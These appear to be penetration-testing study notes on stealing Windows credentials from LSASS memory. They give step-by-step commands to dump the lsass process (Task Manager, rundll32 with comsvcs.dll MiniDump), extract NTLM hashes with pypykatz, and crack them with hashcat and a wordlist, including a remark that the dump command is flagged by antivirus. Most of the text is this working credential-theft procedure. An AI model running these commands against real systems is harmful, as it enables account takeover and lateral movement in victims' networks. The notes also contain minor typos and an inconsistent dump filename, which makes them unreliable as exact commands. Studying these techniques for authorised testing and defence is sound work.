- Upon initial logon, LSASS will:
	- Cach credetnials locally in memory
	- Create access tokens
	- Enforce security policies
	- Write to Windows security log

## Dumping LSASS Process Memory
- Task Manager Method
	- Open Task Manager > Select The Process tab > Find & right click the Local Security Authroity Process > Select Create dump file
	- A file called lsass.DMP is created nad saved in `C:\Users\loggedonusersdirectory\AppData\Local\Temp`
- Rundll32.exe & Comsvcs.dll Method
	- First, determin the PID assigned to the lsass.exe
		 ```shell
			# Command prompt
			tasklist /svc

			# PowerShell
			Get-Process lsass
		```
	 - Create lsass.dmp in PowerShell
	 ```shell
	 rundll32 C:\windows\system32\comsvcs.dll, MiniDump $PID C:\lsass.dmp full
		# Note: This command will be flagged by AV. 
	```

## Extract Credentials using Pypykatz
```bash
pypykatz lsa minidump ./lsass.dump
```

## Crack hash
```bash
hashcat -m 1000 $hash rockyou.txt
```
